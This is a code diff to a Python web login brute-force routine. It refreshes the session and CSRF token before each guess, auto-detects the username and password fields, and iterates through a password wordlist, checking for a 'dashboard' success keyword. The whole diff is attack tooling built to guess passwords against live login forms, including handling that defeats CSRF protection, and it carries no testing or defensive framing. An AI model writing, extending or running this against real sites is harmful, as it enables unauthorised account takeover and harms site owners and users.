@@ -39,14 +39,17 @@ def run_bruteforce(
     username,
     wordlist_path,
     update_progress,
-    log_output,  # NEW: logs each attempt
+    log_output,
     user_field_override=None,
     pass_field_override=None,
-    success_keyword="welcome",
+    success_keyword="dashboard",
     delay=0,
 ):
-    session, action, method, form_data = get_login_form(login_url)
-    if None in (session, action, method, form_data):
+    session = requests.Session()
+
+    # Initial fetch to get form fields
+    action, method, form_data = get_login_form(session, login_url)
+    if None in (action, method, form_data):
         return "[!] Error loading or parsing the login form."
 
     username_field = user_field_override or next(
@@ -70,12 +73,11 @@ def run_bruteforce(
     for i, password in enumerate(passwords):
         password = password.strip()
 
-        # Fetch fresh form and CSRF token before each login attempt
+        # Refresh form and tokens on each attempt (to avoid CSRF issues)
         action, method, form_data = get_login_form(session, login_url)
         if None in (action, method, form_data):
             return "[!] Failed to reload login form."
 
-        # Use overrides or try to auto-detect input fields
         username_field = user_field_override or next(
             (k for k in form_data if "user" in k.lower()), None
         )
@@ -86,7 +88,6 @@ def run_bruteforce(
         if not username_field or not password_field:
             return "[!] Could not detect or override login field names."
 
-        # Update login fields
         form_data[username_field] = username
         form_data[password_field] = password
 
